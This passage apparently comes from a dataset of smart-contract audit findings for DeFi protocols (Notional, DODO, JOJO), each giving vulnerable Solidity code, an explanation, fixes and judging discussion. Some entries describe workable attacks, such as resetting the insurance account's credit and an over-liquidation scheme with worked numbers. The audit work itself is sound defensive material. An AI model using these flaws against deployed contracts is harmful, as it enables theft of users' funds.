otherwise we may leave the account in an unintended\n        // state in this method because we allow it to skip the min borrow check in the next line.\n        (bool didSettle, bool didTransfer) = vaultAccount.settleVaultAccount(vaultConfig);\n        require(didSettle, ""No Settle"");\n\n        vaultAccount.accruePrimeCashFeesToDebt(vaultConfig);\n\n        // Skip Min Borrow Check so that accounts can always be settled\n        vaultAccount.setVaultAccount({vaultConfig: vaultConfig, checkMinBorrow: false});\n\n        if (didTransfer) {\n            // If the vault did a transfer (i.e. withdrew cash) we have to check their collateral ratio. There\n            // is an edge condition where a vault with secondary borrows has an emergency exit. During that process\n            // an account will be left some cash balance in both currencies. It may have excess cash in one and\n            // insufficient cash in the other. A withdraw of the excess in one side will cause the vault account to\n            // be insolvent if we do not run this check. If this scenario indeed does occur, the vault itself must\n            // be upgraded in order to facilitate orderly exits for all of the accounts since they will be prevented\n            // from settling.\n            IVaultAccountHealth(address(this)).checkVaultAccountCollateralRatio(vault, account);\n        }\n    }\n```\n"ч"Cannot permissionless settle the vault account if the user use a blacklisted account\n```\n    /// @notice Settles a matured vault account by transforming it from an fCash maturity into\n    /// a prime cash account. This method is not authenticated, anyone can settle a vault account\n    /// without permission. Generally speaking, this action is economically equivalent no matter\n    /// when it is called. In some edge conditions when the vault is holding prime cash, it is\n    /// advantageous for the vault account to have this called sooner. All vault account actions\n    /// will first settle the vault account before taking any further actions.\n    /// @param account the address to settle\n    /// @param vault the vault the account is in\n    function settleVaultAccount(address account, address vault) external override nonReentrant {\n        requireValidAccount(account);\n        require(account != vault);\n\n        VaultConfig memory vaultConfig = VaultConfiguration.getVaultConfigStateful(vault);\n        VaultAccount memory vaultAccount = VaultAccountLib.getVaultAccount(account, vaultConfig);\n        \n        // Require that the account settled, otherwise we may leave the account in an unintended\n        // state in this method because we allow it to skip the min borrow check in the next line.\n        (bool didSettle, bool didTransfer) = vaultAccount.settleVaultAccount(vaultConfig);\n        require(didSettle, ""No Settle"");\n\n        vaultAccount.accruePrimeCashFeesToDebt(vaultConfig);\n\n        // Skip Min Borrow Check so that accounts can always be settled\n        vaultAccount.setVaultAccount({vaultConfig: vaultConfig, checkMinBorrow: false});\n\n        if (didTransfer) {\n            // If the vault did a transfer (i.e. withdrew cash) we have to check their collateral ratio. There\n            // is an edge condition where a vault with secondary borrows has an emergency exit. During that process\n            // an account will be left some cash balance in both currencies. It may have excess cash in one and\n            // insufficient cash in the other. A withdraw of the excess in one side will cause the vault account to\n            // be insolvent if we do not run this check. If this scenario indeed does occur, the vault itself must\n            // be upgraded in order to facilitate orderly exits for all of the accounts since they will be prevented\n            // from settling.\n            IVaultAccountHealth(address(this)).checkVaultAccountCollateralRatio(vault, account);\n        }\n    }\n```\n\nas the comment suggests, this function should be called permissionless\nand the comment is, which means there should not be able to permissionless reject account settlement\n```\n/// will first settle the vault account before taking any further actions.\n```\n\nthis is calling\n```\n  (bool didSettle, bool didTransfer) = vaultAccount.settleVaultAccount(vaultConfig);\n```\n\nwhich calls\n```\n    /// @notice Settles a matured vault account by transforming it from an fCash maturity into\n    /// a prime cash account. This method is not authenticated, anyone can settle a vault account\n    /// without permission. Generally speaking, this action is economically equivalent no matter\n    /// when it is called. In some edge conditions when the vault is holding prime cash, it is\n    /// advantageous for the vault account to have this called sooner. All vault account actions\n    /// will first settle the vault account before taking any further actions.\n    /// @param account the address to settle\n    /// @param vault the vault the account is in\n    function settleVaultAccount(address account, address vault) external override nonReentrant {\n        requireValidAccount(account);\n        require(account != vault);\n\n        VaultConfig memory vaultConfig = VaultConfiguration.getVaultConfigStateful(vault);\n        VaultAccount memory vaultAccount = VaultAccountLib.getVaultAccount(account, vaultConfig);\n        \n        // Require that the account settled, otherwise we may leave the account in an unintended\n        // state in this method because we allow it to skip the min borrow check in the next line.\n        (bool didSettle, bool didTransfer) = vaultAccount.settleVaultAccount(vaultConfig);\n        require(didSettle, ""No Settle"");\n```\n\nbasically this calls\n```\n        // Calculates the net settled cash if there is any temp cash balance that is net off\n        // against the settled prime debt.\n        bool didTransferPrimary;\n        (accountPrimeStorageValue, didTransferPrimary) = repayAccountPrimeDebtAtSettlement(\n            vaultConfig.primeRate,\n            primeVaultState,\n            vaultConfig.borrowCurrencyId,\n            vaultConfig.vault,\n            vaultAccount.account,\n            vaultAccount.tempCashBalance,\n            accountPrimeStorageValue\n        );\n```\n\ncalling\n```\n    function repayAccountPrimeDebtAtSettlement(\n        PrimeRate memory pr,\n        VaultStateStorage storage primeVaultState,\n        uint16 currencyId,\n        address vault,\n        address account,\n        int256 accountPrimeCash,\n        int256 accountPrimeStorageValue\n    ) internal returns (int256 finalPrimeDebtStorageValue, bool didTransfer) {\n        didTransfer = false;\n        finalPrimeDebtStorageValue = accountPrimeStorageValue;\n        \n        if (accountPrimeCash > 0) {\n            // netPrimeDebtRepaid is a negative number\n            int256 netPrimeDebtRepaid = pr.convertUnderlyingToDebtStorage(\n                pr.convertToUnderlying(accountPrimeCash).neg()\n            );\n\n            int256 netPrimeDebtChange;\n            if (netPrimeDebtRepaid < accountPrimeStorageValue) {\n                // If the net debt change is greater than the debt held by the account, then only\n                // decrease the total prime debt by what is held by the account. The residual amount\n                // will be refunded to the account via a direct transfer.\n                netPrimeDebtChange = accountPrimeStorageValue;\n                finalPrimeDebtStorageValue = 0;\n\n                int256 primeCashRefund = pr.convertFromUnderlying(\n                    pr.convertDebtStorageToUnderlying(netPrimeDebtChange.sub(accountPrimeStorageValue))\n                );\n                TokenHandler.withdrawPrimeCash(\n                    account, currencyId, primeCashRefund, pr, false // ETH will be transferred natively\n                );\n                didTransfer = true;\n            } else {\n                // In this case, part of the account's debt is repaid.\n                netPrimeDebtChange = netPrimeDebtRepaid;\n                finalPrimeDebtStorageValue = accountPrimeStorageValue.sub(netPrimeDebtRepaid);\n            }\n```\n\nthe token withdrawal logic above try to push ETH to accout\n```\nTokenHandler.withdrawPrimeCash(\n account, currencyId, primeCashRefund, pr, false // ETH will be transferred natively\n);\n```\n\nthis is calling\n```\n  function withdrawPrimeCash(\n        address account,\n        uint16 currencyId,\n        int256 primeCashToWithdraw,\n        PrimeRate memory primeRate,\n        bool withdrawWrappedNativeToken\n    ) internal returns (int256 netTransferExternal) {\n        if (primeCashToWithdraw == 0) return 0;\n        require(primeCashToWithdraw < 0);\n\n        Token memory underlying = getUnderlyingToken(currencyId);\n        netTransferExternal = convertToExternal(\n            underlying, \n            primeRate.convertToUnderlying(primeCashToWithdraw) \n        );\n\n        // Overflow not possible due to int256\n        uint256 withdrawAmount = uint256(netTransferExternal.neg());\n        _redeemMoneyMarketIfRequired(currencyId, underlying, withdrawAmount);\n\n        if (underlying.tokenType == TokenType.Ether) {\n            GenericToken.transferNativeTokenOut(account, withdrawAmount, withdrawWrappedNativeToken);\n        } else {\n            GenericToken.safeTransferOut(underlying.tokenAddress, account, withdrawAmount);\n        }\n\n        _postTransferPrimeCashUpdate(account, currencyId, netTransferExternal, underlying, primeRate);\n    }\n```\n\nnote the function call\n```\nif (underlying.tokenType == TokenType.Ether) {\n GenericToken.transferNativeTokenOut(account, withdrawAmount, withdrawWrappedNativeToken);\n} else {\n GenericToken.safeTransferOut(underlying.tokenAddress, account, withdrawAmount);\n}\n```\n\nif the token type is not ETHER,\nwe are transfer the underlying ERC20 token to the account\n```\nGenericToken.safeTransferOut(underlying.tokenAddress, account, withdrawAmount);\n```\n\nthe token in-scoped is\n```\nERC20:  Any Non-Rebasing token. ex. USDC, DAI, USDT (future), wstETH, WETH, WBTC, FRAX, CRV, etc.\n```\n\nUSDC is common token that has blacklisted\nif the account is blacklisted, the transfer would revert and the account cannot be settled!"ч
getAccountPrimeDebtBalance() always return 0чmediumч```\n    function getAccountPrimeDebtBalance(uint16 currencyId, address account) external view override returns (\n        int256 debtBalance\n    ) {\n        mapping(address => mapping(uint256 => BalanceStorage)) storage store = LibStorage.getBalanceStorage();\n        BalanceStorage storage balanceStorage = store[account][currencyId];\n        int256 cashBalance = balanceStorage.cashBalance;\n\n        // Only return cash balances less than zero\n        debtBalance = cashBalance < 0 ? debtBalance : 0;   //<------@audit wrong, Always return 0\n    }\n```\nчSpelling errors that result in `getAccountPrimeDebtBalance()` Always return 0\n`getAccountPrimeDebtBalance()` use for Show current debt\n```\n    function getAccountPrimeDebtBalance(uint16 currencyId, address account) external view override returns (\n        int256 debtBalance\n    ) {\n        mapping(address => mapping(uint256 => BalanceStorage)) storage store = LibStorage.getBalanceStorage();\n        BalanceStorage storage balanceStorage = store[account][currencyId];\n        int256 cashBalance = balanceStorage.cashBalance;\n\n        // Only return cash balances less than zero\n        debtBalance = cashBalance < 0 ? debtBalance : 0;   //<------@audit wrong, Always return 0\n    }\n```\n\nIn the above code we can see that due to a spelling error, `debtBalance` always ==0 should use `debtBalance = cashBalance < 0 ? cashBalance : 0;`ч```\n    function getAccountPrimeDebtBalance(uint16 currencyId, address account) external view override returns (\n        int256 debtBalance\n    ) {\n        mapping(address => mapping(uint256 => BalanceStorage)) storage store = LibStorage.getBalanceStorage();\n        BalanceStorage storage balanceStorage = store[account][currencyId];\n        int256 cashBalance = balanceStorage.cashBalance;\n\n        // Only return cash balances less than zero\n-       debtBalance = cashBalance < 0 ? debtBalance : 0;\n+       debtBalance = cashBalance < 0 ? cashBalance : 0;\n    }\n```\nч`getAccountPrimeDebtBalance()` is the external method to check the debt If a third party integrates with notional protocol, this method will be used to determine whether the user has debt or not and handle it accordingly, which may lead to serious errors in the third party's business\nCode Snippet\nTool used\nManual Review
Debt cannot be repaid without redeeming vault shareчmediumч```\nVaultAccountAction.exitVault\n└─VaultConfiguration.redeemWithDebtRepayment\n  └─VaultConfiguration._redeem\n    └─IStrategyVault.redeemFromNotional\n      └─MetaStable2TokenAuraVault._redeemFromNotional\n        └─MetaStable2TokenAuraHelper.redeem\n          └─Balancer2TokenPoolUtils._redeem\n            └─StrategyUtils._redeemStrategyTokens\n```\nч"Debt cannot be repaid without redeeming the vault share. As such, users have to redeem a certain amount of vault shares/strategy tokens at the current market price to work around this issue, which deprives users of potential gains from their vault shares if they maintain ownership until the end.\nThere is a valid scenario where users want to repay debt without redeeming their vault shares/strategy tokens (mentioned in the comments above ""or if it is set to zero"" at Line 251-263). In this case, the users will call `exitVault` with `vaultSharesToRedeem` parameter set to zero. The entire debt to be repaid will then be recovered directly from the account's wallet.\nFollowing is the function trace of the VaultAccountAction.exitVault:\n```\nVaultAccountAction.exitVault\n└─VaultConfiguration.redeemWithDebtRepayment\n  └─VaultConfiguration._redeem\n    └─IStrategyVault.redeemFromNotional\n      └─MetaStable2TokenAuraVault._redeemFromNotional\n        └─MetaStable2TokenAuraHelper.redeem\n          └─Balancer2TokenPoolUtils._redeem\n            └─StrategyUtils._redeemStrategyTokens\n```\n\nThe problem is that if the vault shares/strategy tokens to be redeemed are zero, the `poolClaim` will be zero and cause a revert within the `StrategyUtils._redeemStrategyTokens` function call. Thus, users who want to repay debt without redeeming their vault shares/strategy tokens will be unable to do so."ч"
Rebalance process reverts due to zero amount deposit and redemptionчmediumч```\nfunction deposit(address _reserve, uint256 _amount, uint16 _referralCode)\n    external\n    payable\n    nonReentrant\n    onlyActiveReserve(_reserve)\n    onlyUnfreezedReserve(_reserve)\n    onlyAmountGreaterThanZero(_amount)\n{\n```\nчDepositing or redeeming zero amount against certain external money markets will cause the rebalancing process to revert.\nFor a specific holding (e.g. cToken), the `redeemAmounts` and `depositAmounts` are mutually exclusive. So if the `redeemAmounts` for a specific holding is non-zero, the `depositAmounts` will be zero and vice-versa. This is because of the if-else block at Lines 48-56 below. Only `redeemAmounts` or `depositAmounts` of a specific holding can be initialized, but not both.\nFor each holding, the following codes always deposit or redeem a zero value. For example, cETH holding, if the `redeemAmounts` is 100 ETH, the `depositAmounts` will be zero. (because of the if-else block). Therefore, `getDepositCalldataForRebalancing` function will be executed and attempt to deposit zero amount to Compound.\nThe problem is that the deposit/mint or redeem/burn function of certain external money markets will revert if the amount is zero. Notional is considering integrating with a few external monkey markets and one of them is AAVE.\nIn this case, when Notional `deposit` zero amount to AAVE or `redeem` zero amount from AAVE, it causes the rebalancing process to revert because of the `onlyAmountGreaterThanZero` modifier on the AAVE's `deposit` and `redeem` function.\n```\nfunction deposit(address _reserve, uint256 _amount, uint16 _referralCode)\n    external\n    payable\n    nonReentrant\n    onlyActiveReserve(_reserve)\n    onlyUnfreezedReserve(_reserve)\n    onlyAmountGreaterThanZero(_amount)\n{\n```\n\n```\nfunction redeemUnderlying(\n    address _reserve,\n    address payable _user,\n    uint256 _amount,\n    uint256 _aTokenBalanceAfterRedeem\n)\n    external\n    nonReentrant\n    onlyOverlyingAToken(_reserve)\n    onlyActiveReserve(_reserve)\n    onlyAmountGreaterThanZero(_amount)\n{\n```\n\nThe above issue is not only limited to AAVE and might also happen in other external markets.\nEven if the external money market does not revert when minting or burning zero amount, there is a small possibility that the supported underlying token might revert on zero value transfer (https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers). Because mint will do a `transferOut` and burn will do a `transferIn` against zero valueч
MarginTrading.sol: The whole balance and not just the traded funds are deposited into Aave when a trade is openedчmediumч```\n_tradeAmounts[i] = IERC20(_tradeAssets[i]).balanceOf(address(this)); \n_lendingPoolDeposit(_tradeAssets[i], _tradeAmounts[i], 1); \n```\nчIt's expected by the protocol that funds can be in the `MarginTrading` contract without being deposited into Aave as margin.\nWe can see this by looking at the `MarginTradingFactory.depositMarginTradingETH` and `MarginTradingFactory.depositMarginTradingERC20` functions.\nIf the user sets `margin=false` as the parameter, the funds are only sent to the `MarginTrading` contract but NOT deposited into Aave.\nSo clearly there is the expectation for funds to be in the `MarginTrading` contract that should not be deposited into Aave.\nThis becomes an issue when a trade is opened.\nLet's look at the `MarginTrading._openTrade` function that is called when a trade is opened:\nThe whole balance of the token will be deposited into Aave:\n```\n_tradeAmounts[i] = IERC20(_tradeAssets[i]).balanceOf(address(this)); \n_lendingPoolDeposit(_tradeAssets[i], _tradeAmounts[i], 1); \n```\n\nNot just those funds that have been acquired by the swap. This means that funds that should stay in the `MarginTrading` contract might also be deposited as margin.чSource: https://github.com/sherlock-audit/2023-05-dodo-judging/issues/72\nFound by\nroguereddwarf\nIt is necessary to differentiate the funds that are acquired by the swap and those funds that were there before and should stay in the contract:\nIf funds that were in the contract prior to the swap should be deposited there is the separate `MarginTrading.lendingPoolDeposit` function to achieve this.\nDiscussion\nZack995\nIn terms of product design, users do not have a separate concept of balance. However, the contract is designed to be more flexible and allows for balances to be maintained. Users will not perceive or interact with balances in terms of user experience or operations.\nroguereddwarf\nBased on the smart contract logic there is clearly the notion of balance that is not intended to be used as collateral (but e.g. used to repay a loan). If this notion of a separate balance is not exposed on the front-end this is not a sufficient mitigation of the issue since the issue is clearly present in the smart contract.\nsecuritygrid\nEscalate for 10 USDC This is valid low/info as stated by the sponsor. No bad impact.\nsherlock-admin\nEscalate for 10 USDC This is valid low/info as stated by the sponsor. No bad impact.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nctf-sec\ncan consider #80 duplicate of this one\nhrishibhat\nResult: Medium Has duplicates Considering this issue as valid medium based on the above comments from smart contract perspective and enforcing in the front end is not a mitigation as mentioned above.\nsherlock-admin\nEscalations have been resolved successfully!\nEscalation status:\nsecuritygrid: rejectedчWhen opening a trade funds can be deposited into Aave unintentionally. Thereby the funds act as margin and the trade can incur a larger loss than expected.\nCode Snippet\nTool used\nManual Review
BalancerPairOracle#getPrice will revert due to division by zero in some casesчmediumч```\nfunction computeFairReserves(\n        uint256 resA,\n        uint256 resB,\n        uint256 wA,\n        uint256 wB,\n        uint256 pxA,\n        uint256 pxB\n    ) internal pure returns (uint256 fairResA, uint256 fairResB) {\n     // rest of code\n     //@audit r0 = 0 when resA < resB.\n->      uint256 r0 = resA / resB;\n        uint256 r1 = (wA * pxB) / (wB * pxA);\n        // fairResA = resA * (r1 / r0) ^ wB\n        // fairResB = resB * (r0 / r1) ^ wA\n        if (r0 > r1) {\n            uint256 ratio = r1 / r0;\n            fairResA = resA * (ratio ** wB);\n            fairResB = resB / (ratio ** wA);\n        } else {\n->          uint256 ratio = r0 / r1;  // radio = 0 when r0 = 0\n->          fairResA = resA / (ratio ** wB);    // revert divided by 0\n            fairResB = resB * (ratio ** wA);\n        }\n    }\n```\nч`BalancerPairOracle#getPrice` internally calls `computeFairReserves`, which returns fair reserve amounts given spot reserves, weights, and fair prices. When the parameter `resA` passed to `computeFairReserves` is smaller than `resB`, division by 0 will occur.\nIn `BalancerPairOracle#getPrice`, resA and resB passed to `computeFairReserves` are the balance of TokenA and TokenB of the pool respectively. It is common for the balance of TokenB to be greater than the balance of TokenA.\n```\nfunction computeFairReserves(\n        uint256 resA,\n        uint256 resB,\n        uint256 wA,\n        uint256 wB,\n        uint256 pxA,\n        uint256 pxB\n    ) internal pure returns (uint256 fairResA, uint256 fairResB) {\n     // rest of code\n     //@audit r0 = 0 when resA < resB.\n->      uint256 r0 = resA / resB;\n        uint256 r1 = (wA * pxB) / (wB * pxA);\n        // fairResA = resA * (r1 / r0) ^ wB\n        // fairResB = resB * (r0 / r1) ^ wA\n        if (r0 > r1) {\n            uint256 ratio = r1 / r0;\n            fairResA = resA * (ratio ** wB);\n            fairResB = resB / (ratio ** wA);\n        } else {\n->          uint256 ratio = r0 / r1;  // radio = 0 when r0 = 0\n->          fairResA = resA / (ratio ** wB);    // revert divided by 0\n            fairResB = resB * (ratio ** wA);\n        }\n    }\n```\n\nAnother case is when the decimals of tokenA is smaller than the decimals of tokenB, such as usdc(e6)-weth(e18).чDiscussion\nsecuritygrid\nEscalate for 10 USDC This is a valid M/H. Please review Vulnerability Detail of this report, it describes 2 cases:\nresA and resB passed to computeFairReserves are the balance of TokenA and TokenB of the pool respectively. It is common for the balance of TokenB to be greater than the balance of TokenA.\nwhen the decimals of tokenA is smaller than the decimals of tokenB, such as usdc(e6)-weth(e18).\nThis issue is same root as #28. The impact described in #28 is only possible if the dp of the two tokens are different. But it is not completely correct, because when the dp of token0 is less than the dp of token1, a division by zero error occurs, such as token0(e6)-token1(e18). Merging the two reports is the best description.\nsherlock-admin\nEscalate for 10 USDC This is a valid M/H. Please review Vulnerability Detail of this report, it describes 2 cases:\nresA and resB passed to computeFairReserves are the balance of TokenA and TokenB of the pool respectively. It is common for the balance of TokenB to be greater than the balance of TokenA.\nwhen the decimals of tokenA is smaller than the decimals of tokenB, such as usdc(e6)-weth(e18).\nThis issue is same root as #28. The impact described in #28 is only possible if the dp of the two tokens are different. But it is not completely correct, because when the dp of token0 is less than the dp of token1, a division by zero error occurs, such as token0(e6)-token1(e18). Merging the two reports is the best description.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nIAm0x52\nAgreed with escalation. This and #28 are dupes and this does a better job of describing the issue so it should be the main issue. Additionally given that the contract would become nonfunctional rather than return an incorrect price, I agree with the watson's original severity of medium.\nhrishibhat\nEscalation accepted\nValid medium Making this issue the main one and #28 a duplicate of this issue.\nsherlock-admin\nEscalation accepted\nValid medium Making this issue the main one and #28 a duplicate of this issue.\n```\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n```\nчAll functions that subcall `BalancerPairOracle#getPrice` will be affected.\nCode Snippet\nTool used\nManual Review
Subaccount#execute lacks payableчmediumч```\nfunction execute(address to, bytes calldata data, uint256 value) external onlyOwner returns (bytes memory){\n        require(to != address(0));\n->      (bool success, bytes memory returnData) = to.call{value: value}(data);\n        if (!success) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n        emit ExecuteTransaction(owner, address(this), to, data, value);\n        return returnData;\n    }\n```\nч`Subaccount#execute` lacks `payable`. If `value` in `Subaccount#execute` is not zero, it could always revert.\n`Subaccount#execute` lacks `payable`. The caller cannot send the value.\n```\nfunction execute(address to, bytes calldata data, uint256 value) external onlyOwner returns (bytes memory){\n        require(to != address(0));\n->      (bool success, bytes memory returnData) = to.call{value: value}(data);\n        if (!success) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n        emit ExecuteTransaction(owner, address(this), to, data, value);\n        return returnData;\n    }\n```\n\nThe `Subaccount` contract does not implement receive() `payable` or fallback() `payable`, so it is unable to receive value (eth) . Therefore, `Subaccount#execute` needs to add `payable`.чAdd a receive() external `payable` to the contract or `execute()` to add a `payable` modifier.\nDiscussion\nJoscelynFarr\nfix link: https://github.com/JOJOexchange/smart-contract-EVM/commit/64dfd055deeae857fa99d4703cdbf7ba1291b8ad\nIAm0x52\nFix looks good. `execute()` is now payable and value is check to make sure no ETH is left in the contractч`Subaccount#execute` cannot work if `value` != 0.\nCode Snippet\nTool used\nManual Review
It's possible to reset primaryCredit and secondaryCredit for insurance accountчmediumч```\n    function handleBadDebt(Types.State storage state, address liquidatedTrader)\n        external\n    {\n        if (\n            state.openPositions[liquidatedTrader].length == 0 &&\n            !Liquidation._isSafe(state, liquidatedTrader)\n        ) {\n            int256 primaryCredit = state.primaryCredit[liquidatedTrader];\n            uint256 secondaryCredit = state.secondaryCredit[liquidatedTrader];\n            state.primaryCredit[state.insurance] += primaryCredit;\n            state.secondaryCredit[state.insurance] += secondaryCredit;\n            state.primaryCredit[liquidatedTrader] = 0;\n            state.secondaryCredit[liquidatedTrader] = 0;\n            emit HandleBadDebt(\n                liquidatedTrader,\n                primaryCredit,\n                secondaryCredit\n            );\n        }\n    }\n```\nчWhen because of negative credit after liquidations of another accounts, insurance address doesn't pass `isSafe` check, then malicious user can call JOJOExternal.handleBadDebt and reset both primaryCredit and secondaryCredit for insurance account.\n`insurance` account is handled by JOJO team. Team is responsible to top up this account in order to cover losses. When bad debt is handled, then its negative credit value is added to the `insurance` account. Because of that it's possible that primaryCredit of `insurance` account is negative and `Liquidation._isSafe(state, insurance) == false`.\n```\n    function handleBadDebt(Types.State storage state, address liquidatedTrader)\n        external\n    {\n        if (\n            state.openPositions[liquidatedTrader].length == 0 &&\n            !Liquidation._isSafe(state, liquidatedTrader)\n        ) {\n            int256 primaryCredit = state.primaryCredit[liquidatedTrader];\n            uint256 secondaryCredit = state.secondaryCredit[liquidatedTrader];\n            state.primaryCredit[state.insurance] += primaryCredit;\n            state.secondaryCredit[state.insurance] += secondaryCredit;\n            state.primaryCredit[liquidatedTrader] = 0;\n            state.secondaryCredit[liquidatedTrader] = 0;\n            emit HandleBadDebt(\n                liquidatedTrader,\n                primaryCredit,\n                secondaryCredit\n            );\n        }\n    }\n```\n\nSo it's possible for anyone to call `handleBadDebt` for `insurance` address, once its primaryCredit is negative and `Liquidation._isSafe(state, insurance) == false`. This will reset both primaryCredit and secondaryCredit variables to 0 and break `insurance` calculations.чDo not allow `handleBadDebt` call with insurance address.\nDiscussion\nJoscelynFarr\nfix link: https://github.com/JOJOexchange/smart-contract-EVM/commit/78c53b4721ae7bb97fb922f78342d0ee4a1825dd\nIAm0x52\nFix looks good. Since the order has been changed, clearing bad debt on the insurance account will result it in still having the same debt before and after the callчInsurance primaryCredit and secondaryCredit variables are reset.\nCode Snippet\nProvided above\nTool used\nManual Review
Lack of burn mechanism for JUSD repayments causes oversupply of JUSDчmediumч```\n    function _repay(\n        DataTypes.UserInfo storage user,\n        address payer,\n        address to,\n        uint256 amount,\n        uint256 tRate\n    ) internal returns (uint256) {\n        require(amount != 0, JUSDErrors.REPAY_AMOUNT_IS_ZERO);\n        uint256 JUSDBorrowed = user.t0BorrowBalance.decimalMul(tRate);\n        uint256 tBorrowAmount;\n        uint256 t0Amount;\n        if (JUSDBorrowed <= amount) {\n            tBorrowAmount = JUSDBorrowed;\n            t0Amount = user.t0BorrowBalance;\n        } else {\n            tBorrowAmount = amount;\n            t0Amount = amount.decimalDiv(tRate);\n        }\n        IERC20(JUSD).safeTransferFrom(payer, address(this), tBorrowAmount);\n        user.t0BorrowBalance -= t0Amount;\n        t0TotalBorrowAmount -= t0Amount;\n        emit Repay(payer, to, tBorrowAmount);\n        return tBorrowAmount;\n    }\n```\nч`JUSDBank.repay()` allow users to repay their JUSD debt and interest by transfering in JUSD tokens. Without a burn mechanism, it will cause an oversupply of JUSD that is no longer backed by any collateral.\n`JUSDBank` receives JUSD tokens for the repayment of debt and interest. However, there are no means to burn these tokens, causing JUSD balance in `JUSDBank` to keep increasing.\nThat will lead to an oversupply of JUSD that is not backed by any collateral. And the oversupply of JUSD will increase significantly during market due to mass repayments from liquidation.\n```\n    function _repay(\n        DataTypes.UserInfo storage user,\n        address payer,\n        address to,\n        uint256 amount,\n        uint256 tRate\n    ) internal returns (uint256) {\n        require(amount != 0, JUSDErrors.REPAY_AMOUNT_IS_ZERO);\n        uint256 JUSDBorrowed = user.t0BorrowBalance.decimalMul(tRate);\n        uint256 tBorrowAmount;\n        uint256 t0Amount;\n        if (JUSDBorrowed <= amount) {\n            tBorrowAmount = JUSDBorrowed;\n            t0Amount = user.t0BorrowBalance;\n        } else {\n            tBorrowAmount = amount;\n            t0Amount = amount.decimalDiv(tRate);\n        }\n        IERC20(JUSD).safeTransferFrom(payer, address(this), tBorrowAmount);\n        user.t0BorrowBalance -= t0Amount;\n        t0TotalBorrowAmount -= t0Amount;\n        emit Repay(payer, to, tBorrowAmount);\n        return tBorrowAmount;\n    }\n```\nч
In over liquidation, if the liquidatee has USDC-denominated assets for sale, the liquidator can buy the assets with USDC to avoid paying USDC to the liquidateeчmediumч```\n        } else {\n            //            actualJUSD = actualCollateral * priceOff\n            //            = JUSDBorrowed * priceOff / priceOff * (1-insuranceFeeRate)\n            //            = JUSDBorrowed / (1-insuranceFeeRate)\n            //            insuranceFee = actualJUSD * insuranceFeeRate\n            //            = actualCollateral * priceOff * insuranceFeeRate\n            //            = JUSDBorrowed * insuranceFeeRate / (1- insuranceFeeRate)\n            liquidateData.actualCollateral = JUSDBorrowed\n                .decimalDiv(priceOff)\n                .decimalDiv(JOJOConstant.ONE - reserve.insuranceFeeRate);\n            liquidateData.insuranceFee = JUSDBorrowed\n                .decimalMul(reserve.insuranceFeeRate)\n                .decimalDiv(JOJOConstant.ONE - reserve.insuranceFeeRate);\n            liquidateData.actualLiquidatedT0 = liquidatedInfo.t0BorrowBalance;\n            liquidateData.actualLiquidated = JUSDBorrowed;\n        }\n\n        liquidateData.liquidatedRemainUSDC = (amount -\n            liquidateData.actualCollateral).decimalMul(price);\n```\nчIn over liquidation, if the liquidatee has USDC-denominated assets for sale, the liquidator can buy the assets with USDC to avoid paying USDC to the liquidatee\nIn JUSDBank contract, if the liquidator wants to liquidate more collateral than the borrowings of the liquidatee, the liquidator can pay additional USDC to get the liquidatee's collateral.\n```\n        } else {\n            //            actualJUSD = actualCollateral * priceOff\n            //            = JUSDBorrowed * priceOff / priceOff * (1-insuranceFeeRate)\n            //            = JUSDBorrowed / (1-insuranceFeeRate)\n            //            insuranceFee = actualJUSD * insuranceFeeRate\n            //            = actualCollateral * priceOff * insuranceFeeRate\n            //            = JUSDBorrowed * insuranceFeeRate / (1- insuranceFeeRate)\n            liquidateData.actualCollateral = JUSDBorrowed\n                .decimalDiv(priceOff)\n                .decimalDiv(JOJOConstant.ONE - reserve.insuranceFeeRate);\n            liquidateData.insuranceFee = JUSDBorrowed\n                .decimalMul(reserve.insuranceFeeRate)\n                .decimalDiv(JOJOConstant.ONE - reserve.insuranceFeeRate);\n            liquidateData.actualLiquidatedT0 = liquidatedInfo.t0BorrowBalance;\n            liquidateData.actualLiquidated = JUSDBorrowed;\n        }\n\n        liquidateData.liquidatedRemainUSDC = (amount -\n            liquidateData.actualCollateral).decimalMul(price);\n```\n\nThe liquidator needs to pay USDC in the callback and the JUSDBank contract will require the final USDC balance of the liquidatee to increase.\n```\n        require(\n            IERC20(primaryAsset).balanceOf(liquidated) -\n                primaryLiquidatedAmount >=\n                liquidateData.liquidatedRemainUSDC,\n            JUSDErrors.LIQUIDATED_AMOUNT_NOT_ENOUGH\n        );\n```\n\nIf the liquidatee has USDC-denominated assets for sale, the liquidator can purchase the assets with USDC in the callback, so that the liquidatee's USDC balance will increase and the liquidator will not need to send USDC to the liquidatee to pass the check in the JUSDBank contract.чConsider banning over liquidation\nDiscussion\nJoscelynFarr\nThat is in our consideration, if the liquidation triggered, there is a possibility for liquidator to liquidate all collaterals, and the remain collateral will return by the USDC to liquidatee\nJoscelynFarr\nIn fact, I don't understand how the attack occurs\nTrumpero\nThis issue states that the USDC balance of a liquidated user will be validated as the result of liquidation. However, the liquidator can purchase USDC instead of directly transfer USDC in the callback function (when the liquidated user sells USDC elsewhere). After that, the balance check for liquidation is still fulfilled, but the liquidated user will lose assets.\nhrishibhat\nAdditional comment from the Watson:\nAssume liquidationPriceOff = 5% and ETH : USDC = 2000 : 1. Alice's unhealthy position is borrowed for 100000 JUSD, collateral is 60 ETH, meanwhile Alice sells 7 ETH for 14000 USDC in other protocol. Bob liquidates 60 ETH of Alice's position, Bob needs to pay 100000 JUSD, and 60 * 2000 - 100000 / 0.95 = 14737 USDC. In the JOJOFlashLoan callback, Bob sends 100000 JUSD to the contract and buys the 7 ETH that Alice sold in the other protocol (It increases Alice's USDC balance by 14000), and then Bob just send another 14737-14000=737 USDC to Alice to pass the following check\n```\n        require(\n            IERC20(primaryAsset).balanceOf(liquidated) -\n                primaryLiquidatedAmount >=\n                liquidateData.liquidatedRemainUSDC,\n            JUSDErrors.LIQUIDATED_AMOUNT_NOT_ENOUGH\n        );\n```\n\nJoscelynFarr\nfix commit: 